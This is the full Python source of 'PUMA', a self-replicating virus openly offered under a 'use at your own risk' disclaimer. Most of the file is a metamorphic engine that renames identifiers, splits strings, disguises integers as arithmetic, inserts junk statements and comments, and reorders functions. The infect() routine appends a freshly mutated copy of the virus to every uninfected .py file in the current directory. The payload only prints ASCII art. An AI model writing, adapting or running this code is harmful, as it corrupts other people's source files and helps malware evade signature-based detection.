# PUMA is a virus writen in Python that uses a modified version of the PUME engine (https://github.com/Caralludo/PUME)
# to perform mutations in its code. This version of PUME have not got the following features: argparse menu and the
# creation of a directory with the results. Also, I deleted all the comments to make it smaller.
# The virus appends itself at the end of a file. It is configured to infect .py files located in the same directory as
# itself.
# The virus has not got external dependencies.
# Name: the word "puma" is the galician word for cougar.
# Use it at your own risk, I am not responsible for any damages that this may cause.

# -PUMASTART-
import ast
import os
import random
import re
import string
import sys


class ReduceBinOp(ast.NodeTransformer):
    def visit_BinOp(self, node):
        constant = ""
        try:
            constant = ast.unparse(node)
            evaluation = eval(constant, {'__builtins__': None}, {})
            return ast.Constant(evaluation)
        except:
            math_operation_pattern = "[\d]+[\d\ \+\-\*\/\%]+[\d]"
            results = re.findall(math_operation_pattern, constant)
            for result in results:
                evaluation = eval(result, {'__builtins__': None}, {})
                constant = constant.replace(result, str(evaluation), 1)
            new_node = ast.parse(constant)
            return new_node.body[0].value


class ExpandString(ast.NodeTransformer):
    def visit_Constant(self, node):
        if isinstance(node.value, str) and len(node.value) > 1 and not node.value.startswith("__") and \
                not node.value.endswith("__"):
            substrings = self.split_string(node.value)
            new_code = (chr(34) + chr(34) + chr(34) +
                        (chr(34) + chr(34) + chr(34) + "+" + chr(34) + chr(34) + chr(34)).join(substrings) +
                        chr(34) + chr(34) + chr(34))
            new_code = new_code.replace("\\", "\\\\")
            new_code = new_code.replace(chr(0), "\\x00")
            new_code = new_code.replace(chr(9), "\\t")
            new_code = new_code.replace(chr(10), "\\n")
            new_node = ast.parse(new_code)
            return new_node.body[0].value
        return node

    def split_string(self, string_data):
        substrings = []
        while len(string_data) > 0:
            n = random.randint(1, len(string_data))
            substrings.append(string_data[:n])
            string_data = string_data[n:]
        return substrings


class RepairJoinedStr(ast.NodeTransformer):
    def visit_JoinedStr(self, node: ast.JoinedStr):
        final_values = []
        for value in node.values:
            if isinstance(value, ast.BinOp):
                binop_string = ast.unparse(value)
                joined_string = eval(binop_string)
                final_values.append(ast.Constant(joined_string))
            else:
                final_values.append(value)
        node.values = final_values
        return node


class ExpandInteger(ast.NodeTransformer):
    def visit_Constant(self, node):
        if isinstance(node.value, int) and not isinstance(node.value, bool):
            code = ""
            while True:
                try:
                    code = self.get_expression(node.value)
                    break
                except ZeroDivisionError:
                    continue
            new_node = ast.parse(code)
            return new_node.body[0].value
        return node

    def get_expression(self, value):
        random_numbers = [str(random.randint(0, 1000)) for _ in range(random.randint(2, 10))]
        symbols = ["+", "-", "*", "%", "//"]
        operation = []
        for number in random_numbers:
            operation.append(number)
            symbol_index = random.randint(0, len(symbols) - 1)
            operation.append(symbols[symbol_index])
        operation.pop(len(operation) - 1)
        code = "".join(operation)
        result = eval(code)
        last = result - value
        if last > 0:
            code += "-" + str(last)
        elif last < 0:
            code += "+" + str(abs(last))
        return code


class ImportUpdater(ast.NodeTransformer):
    def __init__(self, modules, relations):
        self.modules = modules
        self.relations = relations

    def visit_Attribute(self, node):
        attribute = ast.unparse(node)
        point_position = attribute.rfind(".")
        if point_position == -1:
            return node
        attribute = attribute[:point_position]
        if attribute in self.modules:
            node.attr = self.relations[node.attr]
        return node


class DataClass:
    def __init__(self):
        self.class_name = ""
        self.attributes = []
        self.functions = []
        self.local_variables = {}
        self.name_relations = {}


global_variables = []
function_names = []
local_variables = {}
classes = []


def mutate(code):
    modules = []

    trees = []
    tree = ast.parse(code)
    trees.append(tree)

    trees = expand_nodes(trees)

    exclusions = manage_names(trees)

    name_relations = create_name_relations(exclusions)

    trees = modify_names(trees, exclusions, name_relations, modules)

    trees = update_function_locations(trees)

    sources = [ast.unparse(tree) for tree in trees]

    sources = [add_comments(source) for source in sources]

    return sources[0]


def expand_nodes(trees):
    result = []
    for tree in trees:
        tree = ast.fix_missing_locations(ReduceBinOp().visit(tree))
        tree = ast.fix_missing_locations(ExpandString().visit(tree))
        tree = ast.fix_missing_locations(RepairJoinedStr().visit(tree))
        tree = ast.fix_missing_locations(ExpandInteger().visit(tree))

        delete_pass(tree)
        add_pass(tree)
        fix_pass(tree)

        result.append(tree)
    return result


def delete_pass(tree):
    for node in ast.walk(tree):
        if isinstance(node, ast.Module) or isinstance(node, ast.If) or isinstance(node, ast.For) or \
                isinstance(node, ast.While) or isinstance(node, ast.Try) or isinstance(node, ast.AsyncFor) or \
                isinstance(node, ast.FunctionDef) or isinstance(node, ast.ClassDef) or \
                isinstance(node, ast.AsyncFunctionDef):
            to_remove = []
            for element in node.body:
                if isinstance(element, ast.Pass) and len(node.body) > 1:
                    to_remove.append(element)
            for element in to_remove:
                node.body.remove(element)
        if isinstance(node, ast.If) or isinstance(node, ast.For) or isinstance(node, ast.While) or \
                isinstance(node, ast.Try) or isinstance(node, ast.AsyncFor):
            to_remove = []
            for element in node.orelse:
                if isinstance(element, ast.Pass) and len(node.orelse) > 1:
                    to_remove.append(element)
            for element in to_remove:
                node.body.append(element)
        if isinstance(node, ast.Try):
            to_remove = []
            for element in node.finalbody:
                if isinstance(element, ast.Pass) and len(node.finalbody) > 1:
                    to_remove.append(element)
            for element in to_remove:
                node.body.remove(element)


def add_pass(tree):
    probability = 0.5
    for node in ast.walk(tree):
        if isinstance(node, ast.Module) or isinstance(node, ast.If) or isinstance(node, ast.For) or\
                isinstance(node, ast.While) or isinstance(node, ast.Try) or isinstance(node, ast.AsyncFor) or\
                isinstance(node, ast.FunctionDef) or isinstance(node, ast.ClassDef) or\
                isinstance(node, ast.AsyncFunctionDef):
            position = 0
            for i in range(len(node.body)):
                if random.random() < probability:
                    k = random.randint(1, 5)
                    for j in range(k):
                        node.body.insert(position, ast.Pass())
                    position = i + k + position
        if isinstance(node, ast.If) or isinstance(node, ast.For) or isinstance(node, ast.While) or \
                isinstance(node, ast.Try) or isinstance(node, ast.AsyncFor):
            position = 0
            for i in range(len(node.orelse)):
                if random.random() < probability:
                    k = random.randint(1, 5)
                    for j in range(k):
                        node.orelse.insert(position, ast.Pass())
                    position = i + k + position
        if isinstance(node, ast.Try):
            position = 0
            for i in range(len(node.finalbody)):
                if random.random() < probability:
                    k = random.randint(1, 5)
                    for j in range(k):
                        node.finalbody.insert(position, ast.Pass())
                    position = i + k + position


def fix_pass(tree):
    pass_position = []
    imports_and_pass = {}
    pass_to_remove = []
    for i in range(len(tree.body)):
        node = tree.body[i]
        if isinstance(node, ast.Pass):
            pass_position.append(i)
        elif isinstance(node, ast.ImportFrom) and node.module == "__future__":
            imports_and_pass[i] = pass_position.copy()
            pass_position.clear()
        elif isinstance(node, ast.Import) and node.names[0].name == "__future__":
            imports_and_pass[i] = pass_position.copy()
            pass_position.clear()
    for values in imports_and_pass.values():
        pass_to_remove += values
    pass_to_remove = sorted(pass_to_remove, reverse=True)
    for position in pass_to_remove:
        del tree.body[position]


def manage_names(trees):
    exclusions = []
    for tree in trees:
        get_names_info(tree)

        unclassified_local_variables = [item for sublist in local_variables.values() for item in sublist]

        for data_class in classes:
            discard_necessary_names(data_class)

            unclassified_local_variables += [item for sublist in data_class.local_variables.values() for item in
                                             sublist]

        unclassified_local_variables = list(set(unclassified_local_variables))

        exclusions += global_variables + function_names + unclassified_local_variables
    return list(set(exclusions))


def get_names_info(tree, function_name="", data_class=None):
    for part in tree.body:
        classify_names(part, function_name, data_class)

    if isinstance(tree, ast.If) or isinstance(tree, ast.For) or isinstance(tree, ast.While) or \
            isinstance(tree, ast.Try) or isinstance(tree, ast.AsyncFor):
        for part in tree.orelse:
            classify_names(part, function_name, data_class)

    if isinstance(tree, ast.Try):
        for part in tree.finalbody:
            classify_names(part, function_name, data_class)


def classify_names(part, function_name, data_class=None):
    if isinstance(part, ast.Name) and not function_name and data_class is None:
        global_variables.append(part.id)
    elif isinstance(part, ast.Name) and function_name and data_class is None:
        local_variables[function_name] = local_variables.get(function_name, []) + [part.id]
    elif isinstance(part, ast.Name) and not function_name and data_class is not None:
        data_class.attributes.append(part.id)
    elif isinstance(part, ast.Name) and function_name and data_class is not None:
        data_class.local_variables[function_name] = data_class.local_variables.get(function_name, []) + [part.id]
    elif isinstance(part, ast.arg) and data_class is None:
        local_variables[function_name] = local_variables.get(function_name, []) + [part.arg]
    elif isinstance(part, ast.arg) and data_class is not None:
        data_class.local_variables[function_name] = data_class.local_variables.get(function_name, []) + [part.arg]
    elif isinstance(part, ast.UnaryOp):
        classify_names(part.operand, function_name, data_class)
    elif isinstance(part, ast.BinOp):
        classify_names(part.left, function_name, data_class)
        classify_names(part.right, function_name, data_class)
    elif isinstance(part, ast.BoolOp):
        for value in part.values:
            classify_names(value, function_name, data_class)
    elif isinstance(part, ast.Compare):
        classify_names(part.left, function_name, data_class)
        for comparator in part.comparators:
            classify_names(comparator, function_name, data_class)
    elif isinstance(part, ast.Assign):
        for target in part.targets:
            classify_names(target, function_name, data_class)
    elif isinstance(part, ast.Attribute) and data_class is None:
        classify_names(part.value, function_name)
    elif isinstance(part, ast.Attribute) and data_class is not None:
        if isinstance(part.value, ast.Name) and part.value.id == "self":
            data_class.attributes.append(part.attr)
    elif isinstance(part, ast.NamedExpr) or isinstance(part, ast.AnnAssign) or isinstance(part, ast.AugAssign):
        classify_names(part.target, function_name, data_class)
    elif isinstance(part, ast.Tuple) or isinstance(part, ast.List) or isinstance(part, ast.Set):
        for elt in part.elts:
            classify_names(elt, function_name, data_class)
    elif isinstance(part, ast.If) or isinstance(part, ast.While):
        get_names_info(part, function_name, data_class)
    elif isinstance(part, ast.Try):
        get_names_info(part, function_name, data_class)
        for handler in part.handlers:
            classify_names(handler, function_name, data_class)
    elif isinstance(part, ast.ExceptHandler):
        get_names_info(part, function_name, data_class)
    elif isinstance(part, ast.With) or isinstance(part, ast.AsyncWith):
        for item in part.items:
            classify_names(item.context_expr, function_name, data_class)
            classify_names(item.optional_vars, function_name, data_class)
        get_names_info(part, function_name, data_class)
    elif isinstance(part, ast.ListComp) or isinstance(part, ast.SetComp) or isinstance(part, ast.GeneratorExp):
        classify_names(part.elt, function_name, data_class)
        for generator in part.generators:
            classify_names(generator, function_name, data_class)
    elif isinstance(part, ast.DictComp):
        classify_names(part.key, function_name, data_class)
        classify_names(part.value, function_name, data_class)
        for generator in part.generators:
            classify_names(generator, function_name, data_class)
    elif isinstance(part, ast.comprehension):
        classify_names(part.target, function_name, data_class)
        classify_names(part.iter, function_name, data_class)
        for comparator in part.ifs:
            classify_names(comparator, function_name, data_class)
    elif isinstance(part, ast.For) or isinstance(part, ast.AsyncFor):
        classify_names(part.target, function_name, data_class)
        get_names_info(part, function_name, data_class)
    elif isinstance(part, ast.ClassDef):
        class_info = DataClass()
        class_info.class_name = part.name
        get_names_info(part, function_name, class_info)
        classes.append(class_info)
    elif isinstance(part, ast.arguments):
        for posonlyarg in part.posonlyargs:
            classify_names(posonlyarg, function_name, data_class)
        for arg in part.args:
            classify_names(arg, function_name, data_class)
        for kwonlyarg in part.kwonlyargs:
            classify_names(kwonlyarg, function_name, data_class)
        if part.kwarg:
            classify_names(part.kwarg, function_name, data_class)
        if part.vararg:
            classify_names(part.vararg, function_name, data_class)
    elif (isinstance(part, ast.FunctionDef) or isinstance(part, ast.AsyncFunctionDef)) and data_class is None:
        function_names.append(part.name)
        classify_names(part.args, part.name)
        get_names_info(part, part.name)
    elif (isinstance(part, ast.FunctionDef) or isinstance(part, ast.AsyncFunctionDef)) and data_class is not None:
        data_class.functions.append(part.name)
        classify_names(part.args, part.name, data_class)
        get_names_info(part, part.name, data_class)


def discard_necessary_names(class_data: DataClass):
    for function in class_data.functions:
        if function.startswith("__") and function.endswith("__"):
            class_data.functions.remove(function)
        elif function.startswith("visit_"):
            class_data.functions.remove(function)
    for function in class_data.local_variables.keys():
        if "self" in class_data.local_variables[function]:
            class_data.local_variables[function].remove("self")
    function_to_remove = []
    for function, variables in class_data.local_variables.items():
        if not variables:
            function_to_remove.append(function)
    for function in function_to_remove:
        class_data.local_variables.pop(function)


def create_name_relations(exclusions):
    name_relations = {}

    for old_name in global_variables:
        new_name = generate_name(exclusions)
        name_relations[old_name] = new_name
        exclusions.append(new_name)

    for old_name in function_names:
        new_name = generate_name(exclusions)
        name_relations[old_name] = new_name
        exclusions.append(new_name)

    for data_class in classes:
        new_name = generate_name(exclusions)
        name_relations[data_class.class_name] = new_name
        exclusions.append(new_name)

    for data_class in classes:
        for function in data_class.functions:
            new_name = generate_name(exclusions)
            data_class.name_relations[function] = new_name
            exclusions.append(new_name)

        for attribute in data_class.attributes:
            new_name = generate_name(exclusions)
            data_class.name_relations[attribute] = new_name
            exclusions.append(new_name)

    return name_relations


def modify_names(trees, exclusions, name_relations, modules):
    result = []
    for tree in trees:
        # Updates the variable names related to classes
        for data_class in classes:
            update_attributes(tree, data_class)
            update_class_local_variables(tree, data_class, exclusions)
            update_class_functions_name(tree, data_class)
            change_class_name(tree, data_class.class_name, name_relations)

        update_global_variables(tree, name_relations)
        update_local_variables(tree, exclusions)
        update_functions_name(tree, name_relations)

        update_import_from(tree, modules, name_relations)

        tree = ast.fix_missing_locations(ImportUpdater(modules, name_relations).visit(tree))

        result.append(tree)
    return result


def update_attributes(tree, data_class):
    for attribute in data_class.attributes:
        new_name = data_class.name_relations.get(attribute)
        change_attribute_name(tree, attribute, new_name, data_class.class_name)


def change_attribute_name(tree, old_name, new_name, class_name):
    for node in ast.walk(tree):
        if isinstance(node, ast.Attribute) and node.attr == old_name:
            node.attr = new_name
        elif isinstance(node, ast.ClassDef) and node.name == class_name:
            for part in node.body:
                if not isinstance(part, ast.Assign):
                    continue
                for target in part.targets:
                    if isinstance(target, ast.Name) and target.id == old_name:
                        target.id = new_name


def generate_name(exclusions):
    new_name = get_random_name()
    while new_name in exclusions:
        new_name = get_random_name()
    return new_name


def get_random_name(min_len=5, max_len=15):
    length = random.randint(min_len, max_len)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return result_str


def update_class_local_variables(tree, data_class, exclusions):
    for function in data_class.local_variables.keys():
        for local_variable in data_class.local_variables.get(function):
            new_name = generate_name(exclusions)
            change_class_local_variable(tree, local_variable, new_name, data_class.class_name, function)
            exclusions.append(new_name)


def change_class_local_variable(tree, old_name, new_name, class_name, function):
    for node in ast.walk(tree):
        if not isinstance(node, ast.ClassDef):
            continue
        if not node.name == class_name:
            continue
        for class_def_part in ast.walk(node):
            if not isinstance(class_def_part, ast.FunctionDef):
                continue
            if class_def_part.name != function:
                continue
            for argument in class_def_part.args.args:
                if argument.arg == old_name:
                    argument.arg = new_name
            for posonlyarg in class_def_part.args.posonlyargs:
                if posonlyarg.arg == old_name:
                    posonlyarg.arg = new_name
            for kwonlyarg in class_def_part.args.kwonlyargs:
                if kwonlyarg.arg == old_name:
                    kwonlyarg.arg = new_name
            if class_def_part.args.kwarg:
                if class_def_part.args.kwarg.arg == old_name:
                    class_def_part.args.kwarg.arg = new_name
            if class_def_part.args.vararg:
                if class_def_part.args.vararg.arg == old_name:
                    class_def_part.args.vararg.arg = new_name
            for function_def_part in ast.walk(class_def_part):
                if isinstance(function_def_part, ast.Name) and function_def_part.id == old_name:
                    function_def_part.id = new_name


def update_class_functions_name(tree, data_class):
    for function in data_class.functions:
        new_name = data_class.name_relations.get(function)
        change_class_function_name(tree, function, new_name, data_class.class_name)


def change_class_function_name(tree, old_name, new_name, class_name):
    for node in ast.walk(tree):
        if not isinstance(node, ast.ClassDef):
            continue
        if not node.name == class_name:
            continue
        for class_def_part in ast.walk(node):
            if isinstance(class_def_part, ast.FunctionDef) and class_def_part.name == old_name:
                class_def_part.name = new_name
    for node in ast.walk(tree):
        if isinstance(node, ast.Attribute) and node.attr == old_name:
            node.attr = new_name


def change_class_name(tree, old_name, name_relations):
    for node in ast.walk(tree):
        if isinstance(node, ast.ClassDef) and node.name == old_name:
            node.name = name_relations.get(old_name)
        elif isinstance(node, ast.Name) and node.id == old_name:
            node.id = name_relations.get(old_name)


def update_global_variables(tree, name_relations):
    for global_variable in global_variables:
        new_name = name_relations.get(global_variable)
        change_global_variable(tree, global_variable, new_name)


def change_global_variable(tree, old_name, new_name):
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            if node.id == old_name:
                node.id = new_name


def update_local_variables(tree, exclusions):
    for function in local_variables.keys():
        for local_variable in local_variables.get(function):
            new_name = generate_name(exclusions)
            change_local_variables(tree, local_variable, new_name, function)
            exclusions.append(new_name)


def change_local_variables(tree, old_name, new_name, function_name):
    for node in ast.walk(tree):
        if not isinstance(node, ast.FunctionDef):
            continue
        if node.name != function_name:
            continue
        for argument in node.args.args:
            if argument.arg == old_name:
                argument.arg = new_name
        for posonlyarg in node.args.posonlyargs:
            if posonlyarg.arg == old_name:
                posonlyarg.arg = new_name
        for kwonlyarg in node.args.kwonlyargs:
            if kwonlyarg.arg == old_name:
                kwonlyarg.arg = new_name
        if node.args.kwarg:
            if node.args.kwarg.arg == old_name:
                node.args.kwarg.arg = new_name
        if node.args.vararg:
            if node.args.vararg.arg == old_name:
                node.args.vararg.arg = new_name
        for part in ast.walk(node):
            if isinstance(part, ast.Name):
                if part.id == old_name:
                    part.id = new_name


def update_functions_name(tree, name_relations):
    for function in function_names:
        new_name = name_relations.get(function)
        change_function_name(tree, function, new_name)


def change_function_name(tree, old_name, new_name):
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            if node.id == old_name:
                node.id = new_name
        elif isinstance(node, ast.FunctionDef):
            if node.name == old_name:
                node.name = new_name


def update_import_from(tree, modules, name_relations):
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module in modules:
            for i in range(len(node.names)):
                old_name = node.names[i].name
                node.names[i].name = name_relations[old_name]


def update_function_locations(trees):
    result = []
    for tree in trees:
        change_global_functions_location(tree)
        change_class_functions_location(tree)
        result.append(tree)
    return result


def change_global_functions_location(tree):
    function_locations = []
    for i in range(len(tree.body)):
        if isinstance(tree.body[i], ast.FunctionDef):
            function_locations.append(i)
    if len(function_locations) <= 1:
        return
    for i in range(len(function_locations)):
        j, k = random.sample(function_locations, 2)
        tree.body[j], tree.body[k] = tree.body[k], tree.body[j]


def change_class_functions_location(tree):
    for node in ast.walk(tree):
        function_locations = []
        if isinstance(node, ast.ClassDef):
            for i in range(len(node.body)):
                if isinstance(node.body[i], ast.FunctionDef):
                    function_locations.append(i)
            if len(function_locations) <= 1:
                break
            for i in range(len(function_locations)):
                j, k = random.sample(function_locations, 2)
                node.body[j], node.body[k] = node.body[k], node.body[j]


def add_comments(code):
    if not code:
        return ""
    lines = code.split(chr(10))
    n = random.randint(len(lines) // 2, len(lines) * 2)
    for _ in range(random.randint(1, n)):
        position = random.randint(1, len(lines) - 1)
        comment = "#" + get_random_name(1, 50)
        spaces = random.randint(0, len(lines[position]) // 2)
        lines.insert(position, " " * spaces + comment)
    return chr(10).join(lines)


def virus():
    with open(sys.argv[0], "r") as file:
        code = file.read()

    start = code.find(chr(35) + " -PUMASTART-")
    end = code.find(chr(35) + " -PUMAEND-")

    virus_code = code[start + 13:end]
    infect(virus_code)
    if "puma.py" not in sys.argv[0]:
        payload()
    else:
        print("Infected!")


def infect(virus_code):
    path = "."
    for file_name in os.listdir(path):
        if file_name.endswith(".py"):
            with open(file_name, "r+") as file:
                code = file.read()
                if chr(35) + " -PUMASTART-" not in code:
                    mutated_code = mutate(virus_code)
                    file.write(chr(10) + chr(35) + " -PUMASTART-")
                    file.write(mutated_code)
                    file.write(chr(10) + chr(35) + " -PUMAEND-")


def payload():
    print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠤⠤⢤⠤⠔⠒⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠠⠤⠤⣄⣠⣀⠀⢀⣠⣤⣦⣤⣤⣤⣤⣵⣌⠛⡦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢺⣷⣿⣿⡿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣗⣦⣼⣯⡤⢹⣶⣍⠲⢤⣄⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⠁
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⣿⡿⠁⠀⠀
⠐⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⠟⣱⣿⠏⠀⠀⠀⠟⠁⠀⠀⠀
⠀⠈⢿⣿⣿⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⢰⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣧⡀⠀⢠⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠈⠻⠿⠟⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")


virus()

# -PUMAEND-
